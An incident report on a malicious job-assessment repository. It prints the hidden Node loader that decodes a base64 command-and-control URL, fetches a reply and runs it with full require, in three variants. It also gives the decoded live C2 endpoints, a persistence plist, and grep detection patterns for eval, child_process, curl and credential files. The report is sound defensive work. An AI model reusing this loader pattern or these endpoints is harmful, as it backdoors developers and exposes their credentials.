2. Executive Summary

On 2026-10-06, a security review of a "technical assessment" repository (requested by a LinkedIn recruiter) revealed a remote-code-execution (RCE) backdoor. Investigation showed the victim's Mac was already compromised: two malicious processes had been running continuously since 2026-09-23, maintained by LaunchAgents impersonating Apple system services, executing a 4.6 MB Node payload plus an obfuscated Python info-stealer.

The backdoor technique was found in three separate repositories sent to the victim over roughly ten months, indicating a sustained, targeted campaign rather than a single incident. Active persistence was neutralized, all payloads quarantined (preserved as evidence), and the infected source repos were either quarantined or surgically disinfected. A git-history check confirmed the malware was never committed or pushed to the victim's GitHub.

4. The Malware — Technical Deep Dive (with code)

The repo looked like an ordinary Node/Express backend — routes, controllers, middleware. The malicious logic was tiny and hidden in a file named, innocently, middleware/validator/errorHandler.js.

// middleware/validator/errorHandler.js — the "error handler" that isn't

const errorHandler = (error) => {
  // takes a STRING and runs it as code
  const createHandler = (errCode) => {
    const handler = new (Function.constructor)('require', errCode);
    return handler;
  };
  const handlerFunc = createHandler(error);
  handlerFunc(require);          // <-- executes attacker code with full `require`
};

const errorTimeHandler = async () => {
  const src = atob(process.env.RUNTIME_CONFIG_API_KEY);     // (1) decode hidden URL
  const k   = atob(process.env.RUNTIME_CONFIG_ACCESS_KEY);
  const v   = atob(process.env.RUNTIME_CONFIG_ACCESS_VALUE);
  try {
    globalConfig = await axios.get(src, { headers: { [k]: v } }); // (2) phone home
  } catch (error) {
    errorHandler(error.response?.data || error.message);         // (3) run the reply
  }
};

And in app.js, it runs on every single server start:

const { errorTimeHandler } = require('./middleware/validator/errorHandler');
// ...
errorTimeHandler();     // fires the moment you `npm start`

What those three steps actually do

  1. Decode a hidden URL. atob() base64-decodes a command-and-control (C2) address stashed inside a fake config.env.example — a file developers skim past because it's "just an example." It sat among dummy values like DB_PASSWORD=secretpassword so the one real, working endpoint blended in.
  2. Phone home. An HTTP request to that server with a secret header (x-secret-header: secret).
  3. Execute whatever comes back. new (Function.constructor)('require', responseBody) is eval in disguise: it turns the server's response text into a live function and runs it, handing it require — i.e. full access to the filesystem, network, and process spawning.

The tell is step 3 living on the error path (catch). A normal 200 does nothing and the code looks harmless; the attacker's server returns an HTTP error carrying the payload, so the malicious branch only fires for them. Engineered deniability.

Base64 is not encryption — it's a blindfold

Decoding the hidden config took one command. The decoded values:

RUNTIME_CONFIG_API_KEY      -> https://dev-vic.vercel.app/api/ipcheck-encrypted/602
RUNTIME_CONFIG_ACCESS_KEY   -> x-secret-header
RUNTIME_CONFIG_ACCESS_VALUE -> secret

Attackers use base64 not to protect the string, but to stop a human from reading it during a rushed "assessment."

A smoking gun left commented out

An earlier, blunter version was left in another file, spelling out the intent:

// const res = await axios.get(`https://${domain2}`);    // domain2 = "paw.s.gy/nHIlOf"
// new Function("require", res.data.cookies)(require);    // fetch -> execute

The same trick, three different repos

The identical technique appeared, renamed, across multiple "assessment" repos sent over ~10 months:

// Variant B — injected self-invoking block in a product controller
const getCookie = async () => {
  const src = atob(process.env.DEV_API_KEY);
  const payload = (await axios.get(src)).data.cookie;
  const handler = new (Function.constructor)('require', payload);
  handler(require);
}();

// Variant C — hidden in a "sendGmail" util; C2 was base64 inside products.json
const image = (await axios.get(realImageUrl,
                 { headers: { [realTitle]: realDescription } })).data.cookie;
const parseImage = new (Function.constructor)('require', image);
parseImage(require);

Same DNA every time: decode → fetch → Function.constructor(...)(require).

5. The Second Stage — Payload & Persistence

Running the loader pulled down the second stage. On this machine that meant:

  • ~/Library/Application Support/.sysupdater.dat — a ~4.6 MB Node payload.
  • ~/.n2/way — an obfuscated Python info-stealer (the classic exec(zlib.decompress(base64.b64decode(...))) one-liner), consistent with the family tracked as InvisibleFerret.

For persistence, it dropped LaunchAgents impersonating Apple:

<!-- ~/Library/LaunchAgents/com.apple.systemupdate.plist -->
<key>Label</key>            <string>com.apple.systemupdate</string>
<key>ProgramArguments</key>
<array>
  <string>/Users/<me>/.nvm/versions/node/v16.20.2/bin/node</string>
  <string>/Users/<me>/Library/Application Support/.sysupdater.dat</string>
</array>
<key>RunAtLoad</key>        <true/>
<key>KeepAlive</key>        <true/>
<key>Hide</key>             <true/>
<key>StandardOutPath</key>  <string>/dev/null</string>
<key>StandardErrorPath</key><string>/dev/null</string>

Read that plist as a checklist of bad intentions: it runs at login, restarts if killed, hides itself, silences all output, and wears Apple's name. The process start time (which, unlike file timestamps, cannot be forged) showed it had been running continuously for ~2 weeks before discovery — the file dates (Dec 2025) were backdated to blend in.

7. Impact & Credential Exposure

The malware ran with the user's privileges for weeks (at least 2026-09-23 → 2026-10-06) with the capability and access to read:

  • ~/.npmrc — a GitHub Personal Access Token (ghp_…) and an npm publish token (scope @ashwellvantage).
  • ~/.bash_profile — hardcoded corporate secrets (CMS / OAuth / Cloudinary).
  • Browser credential stores, SSH keys, crypto wallets / keychain.

Assume all of the above are compromised. The npm publish token is the highest-blast-radius item: a stolen token can push a malicious package version that infects every developer who installs it — turning one laptop into a supply-chain incident.

9. Remediation Performed (2026-10-06)

  • Unloaded both LaunchAgents (launchctl bootout); killed the malicious processes (PIDs 782 & 799).
  • Moved all persistence/payload files to ~/malware-quarantine-20261006/ (preserved as evidence, not deleted).
  • Quarantined both JavaTest copies.
  • Surgically removed backdoor code from the web3 and os-demo repos; verified repos re-scan clean.
  • Deleted the malicious .zip; scrubbed the tampered products.json entry.
  • Machine-wide sweep: no additional persistence (cron, other agents, Application Support) found.

10. GitHub Exposure Check

A full git-history search for all backdoor signatures returned clean. The infected folders were untracked (0 tracked files) and never committed or pushed to github.com/abduljavedkhan/home_work. Nobody cloning the victim's repos could have received the malware. (The stolen GitHub token is a separate issue and must still be revoked.)

12. How to Protect Yourself

  • Treat "clone and run my code" like opening a stranger's executable — because it is.
  • Run untrusted / take-home code only in a disposable VM or container, never on your daily machine.
  • Before npm install, read package.json scripts and grep the source (see §13).
  • Be suspicious of *.env.example files containing long base64 strings.
  • Verify recruiters against the real company domain, not a Calendly/Teams link.
  • Keep secrets out of plaintext dotfiles; use a secrets manager.

13. Reusable Shell Commands for Scanning Future Repos

These are the exact (read-only) commands used during this investigation, generalized so you can run them on any repo before installing or running it. Replace REPO with the target folder.

13.1 — Scan source for the RCE / loader signatures

REPO=./path-to-repo

# Core backdoor patterns: dynamic code execution, remote fetch, base64, shell-out
grep -rnEi "eval\(|new Function\(|Function\.constructor|child_process|execSync|spawn\(|atob\(|Buffer\.from\([^)]*base64|fromCharCode|\.data\.cookie" \
  "$REPO" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" \
  --include="*.mjs" --include="*.cjs" --include="*.json" --include="*.env*" \
  | grep -v node_modules

13.2 — Look for hidden C2 URLs / base64 config in "example" env files

# Any env/config file holding a suspicious key or a long base64 blob
grep -rnEi "API_KEY=|ACCESS_KEY=|ACCESS_VALUE=|DEV_API_KEY=|RUNTIME_CONFIG" \
  "$REPO" --include="*.env*" | grep -v node_modules

# Decode a base64 value to reveal a hidden URL (paste the string in):
echo -n 'PASTE_BASE64_HERE' | base64 -d; echo

13.3 — Inspect package.json for malicious install hooks

# Lifecycle scripts (preinstall/postinstall) are a common auto-run vector
grep -rnE "\"(pre|post)?install\"|\"prepare\"|curl |wget |node -e|npx " \
  "$REPO"/package.json "$REPO"/**/package.json 2>/dev/null | grep -v node_modules

13.4 — Check whether the payload already ran (macOS persistence)

# Rogue LaunchAgents/Daemons (esp. ones impersonating Apple, running node/hidden .dat)
ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons

# Suspicious processes running a hidden dot-file payload
ps aux | grep -iE "\.sysupdater|Application Support/\.|/\.[a-z0-9]+/" | grep -v grep

# Odd hidden dirs in HOME (stealers often use short names like ~/.n2)
find ~ -maxdepth 1 -type d -name ".*"

# Cron + shell-profile injection
crontab -l
tail -20 ~/.zshrc ~/.zprofile ~/.bash_profile ~/.bashrc 2>/dev/null

# Secrets that malware targets (confirm nothing is readable in plaintext you forgot about)
cat ~/.npmrc 2>/dev/null

13.5 — If you find a rogue LaunchAgent, neutralize it (preserve evidence)

Q=~/malware-quarantine-$(date +%Y%m%d); mkdir -p "$Q"
launchctl bootout gui/$(id -u)/com.apple.systemupdate 2>/dev/null
mv ~/Library/LaunchAgents/com.apple.systemupdate.plist "$Q"/
pkill -f "\.sysupdater\.dat"
mv "$HOME/Library/Application Support/.sysupdater.dat" "$Q"/ 2>/dev/null
# then compute hashes for your report:
shasum -a 256 "$Q"/*

13.6 — Safest default: never run it on the host

# Inspect inside a throwaway Docker container with NO network and NO install:
docker run --rm -it --network none -v "$PWD/$REPO":/code:ro node:20 bash
# ...then read/grep inside the container; the repo is mounted read-only.

15. Appendix: Detection Prompt (paste into Claude before any new project)

Copy the block below and paste it to Claude Code (or any coding assistant) with a repo attached/open, before you install or run anything:

SECURITY AUDIT — do this before I install or run this repo.

I was asked to clone and run this repository as a job "technical assessment." Treat it as untrusted and potentially malicious (the "Contagious Interview" campaign hides malware in such repos). Do NOT run, install, or execute anything. Only read and analyze. Specifically:

  1. Grep every source and config file (exclude node_modules) for dynamic code execution and remote-fetch patterns: eval(, new Function(, Function.constructor, child_process, execSync, spawn(, atob(, Buffer.from(..., 'base64'), fromCharCode, .data.cookie, and any axios/fetch/http.get whose response is then passed to a function constructor or eval.
  2. Open every .env, .env.example, and config file. Flag any long base64 string or any URL/API key. Base64-decode suspicious values and show me the plaintext (especially decoded URLs).
  3. Inspect package.json (root and nested) for preinstall/postinstall/prepare scripts or any script that pipes to a shell, runs node -e, or downloads a file.
  4. Look for code that runs automatically on import/startup (self-invoking functions, top-level side effects in app.js/entry points, or an "errorHandler"/"config loader" that fetches and executes a remote response).
  5. Check for files or logic that read ~/.npmrc, ~/.ssh, browser profiles, keychains, or crypto wallet paths, or that write to ~/Library/LaunchAgents, cron, or shell profiles.
  6. Give me a verdict: SAFE / SUSPICIOUS / MALICIOUS, with the exact file:line of every finding and a plain-English explanation of what each would do. If MALICIOUS, list the C2 endpoints (decoded) and do not suggest running anything.
